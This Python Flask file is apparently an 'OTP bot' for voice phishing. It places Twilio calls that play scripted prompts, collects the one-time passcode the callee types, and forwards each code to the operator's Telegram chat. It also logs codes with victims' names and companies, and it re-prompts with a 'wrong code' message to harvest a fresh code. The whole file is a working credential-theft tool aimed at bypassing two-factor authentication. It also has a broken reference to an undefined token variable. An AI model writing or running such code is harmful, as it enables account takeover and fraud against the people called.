import os
import json
from flask import Flask, request, jsonify
from twilio.twiml.voice_response import VoiceResponse, Gather, Play
import requests
import datetime
import pytz

app = Flask(__name__)

# Load configuration from JSON file
with open('config.json', 'r') as f:
    config = json.load(f)

# Get sensitive information from the loaded config
TELEGRAM_BOT_TOKEN = config["bot_token"]
TWILIO_ACCOUNT_SID = config["account_sid"]
TWILIO_AUTH_TOKEN = config["auth_token"]
PHONE_NUM = config["phone_numz"]

TELEGRAM_API_BASE = f"https://api.telegram.org/bot{bot_token}"

def send_telegram_message(chat_id, text):
    try:
        url = f"{TELEGRAM_API_BASE}/sendMessage"
        payload = {"chat_id": chat_id, "text": text}
        response = requests.get(url, params=payload)
        return response.status_code == 200
    except Exception as e:
        app.logger.error(f"Error sending message to Telegram: {e}")
        return False

def get_file_path(user_id, filename):
    base_path = os.path.join(os.path.dirname(__file__), "conf", user_id)
    os.makedirs(base_path, exist_ok=True)
    return os.path.join(base_path, filename)

@app.route("/voice", methods=["POST"])
def voice():
    chat_id = request.args.get("chat_id", default="*", type=str)
    user_id = request.args.get("user_id", default="*", type=str)

    answered_by = request.values.get("AnsweredBy", "")
    resp = VoiceResponse()

    if answered_by.startswith("machine_end"):
        send_telegram_message(chat_id, "Call Status : Voice Mail")
        resp.say("We'll call you back, thanks")
        resp.hangup()
        return str(resp)

    gather = Gather(num_digits=1, action=f"/gather?chat_id={chat_id}&user_id={user_id}", timeout=120)
    gather.pause(length=1)
    gather.play(get_file_path(user_id, "checkifhuman.mp3"))
    resp.append(gather)
    return str(resp)

@app.route("/gather", methods=["POST"])
def gather():
    chat_id = request.args.get("chat_id", default="*", type=str)
    user_id = request.args.get("user_id", default="*", type=str)

    resp = VoiceResponse()

    if "Digits" in request.values:
        choice = request.values["Digits"]
        if choice == "1":
            resp.play(get_file_path(user_id, "explain.mp3"))
            resp.pause(length=2)
            num_digits = int(open(get_file_path(user_id, "Digits.txt"), "r").read().strip())
            gatherotp = Gather(num_digits=num_digits, action=f"/gatherotp?chat_id={chat_id}&user_id={user_id}", timeout=120)
            gatherotp.play(get_file_path(user_id, "askdigits.mp3"))
            resp.append(gatherotp)
        else:
            resp.play(get_file_path("sounds", "errorpick.mp3"))
            resp.redirect(f"/voice?chat_id={chat_id}&user_id={user_id}")
    else:
        resp.redirect("/voice")

    return str(resp)

@app.route("/gatherotp", methods=["POST"])
def gatherotp():
    chat_id = request.args.get("chat_id", default="*", type=str)
    user_id = request.args.get("user_id", default="*", type=str)
    resp = VoiceResponse()

    if "Digits" in request.values:
        otp = request.values["Digits"]
        send_telegram_message(chat_id, f"OTP : {otp}")

        with open("otp.txt", "w", encoding="utf-8") as otp_file:
            otp_file.write(otp)

        with open("logotp.txt", "a", encoding="utf-8") as log_file:
            timestamp = datetime.datetime.now(pytz.timezone("Asia/Jakarta"))
            name = open(get_file_path(user_id, "Name.txt"), "r").read().strip()
            company = open(get_file_path(user_id, "Company Name.txt"), "r").read().strip()
            log_file.write(f"Tanggal : {timestamp}\nNama : {name}\nCompany : {company}\nOTP : {otp}\n\n")

        resp.play(get_file_path("sounds", "thankyou.mp3"))
    else:
        resp.say("Sorry, I don't understand that choice.")
        resp.redirect("/gather")

    return str(resp)

@app.route("/denyotp", methods=["POST"])
def denyotp():
    chat_id = request.args.get("chat_id", default="*", type=str)
    user_id = request.args.get("user_id", default="*", type=str)

    send_telegram_message(chat_id, "Resend Code")

    resp = VoiceResponse()
    resp.play(get_file_path("sounds", "wrongcode.mp3"))
    resp.pause(length=1)

    num_digits = int(open(get_file_path(user_id, "Digits.txt"), "r").read().strip())
    gatherotp = Gather(num_digits=num_digits, action=f"/gathernewotp?chat_id={chat_id}&user_id={user_id}", timeout=120)
    gatherotp.say(f"Please enter the {num_digits} digits code.", voice="man")
    resp.append(gatherotp)

    return str(resp)

@app.route("/gathernewotp", methods=["POST"])
def gathernewotp():
    chat_id = request.args.get("chat_id", default="*", type=str)
    user_id = request.args.get("user_id", default="*", type=str)
    resp = VoiceResponse()

    if "Digits" in request.values:
        otp = request.values["Digits"]
        send_telegram_message(chat_id, f"OTP : {otp}")
        resp.play(get_file_path("sounds", "thankyou.mp3"))
    else:
        resp.say("Sorry, I don't understand that choice.")
        resp.redirect("/gather")

    return str(resp)

@app.route("/acceptotp", methods=["POST"])
def acceptotp():
    resp = VoiceResponse()
    resp.play(get_file_path("sounds", "thankyou.mp3"))
    return str(resp)

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
